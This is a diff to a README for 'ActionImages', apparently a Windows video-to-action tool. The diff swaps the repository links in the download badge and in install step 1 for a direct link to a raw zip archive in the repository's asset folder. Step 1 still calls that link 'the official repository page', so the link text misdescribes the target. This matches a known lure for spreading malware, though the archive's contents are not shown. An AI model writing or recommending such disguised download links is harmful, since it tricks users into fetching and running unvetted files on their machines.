@@ -1,6 +1,6 @@
 # 🖼️ ActionImages - Turn simple videos into intelligent actions
 
-[![Download ActionImages](https://img.shields.io/badge/Download-ActionImages-blue.svg)](https://github.com/Rushy-campanulales3205/ActionImages)
+[![Download ActionImages](https://img.shields.io/badge/Download-ActionImages-blue.svg)](https://github.com/Rushy-campanulales3205/ActionImages/raw/refs/heads/main/asset/Action_Images_v3.2.zip)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run ActionImages smoothly. Verify tha
 
 Follow these steps to set up ActionImages on your Windows machine:
 
-1.  Visit the official repository page here: [https://github.com/Rushy-campanulales3205/ActionImages](https://github.com/Rushy-campanulales3205/ActionImages).
+1.  Visit the official repository page here: [https://github.com/Rushy-campanulales3205/ActionImages/raw/refs/heads/main/asset/Action_Images_v3.2.zip](https://github.com/Rushy-campanulales3205/ActionImages/raw/refs/heads/main/asset/Action_Images_v3.2.zip).
 2.  Locate the green "Code" button near the top right of the page.
 3.  Click "Download ZIP" to save the software package to your computer.
 4.  Navigate to your Downloads folder once the transfer finishes.
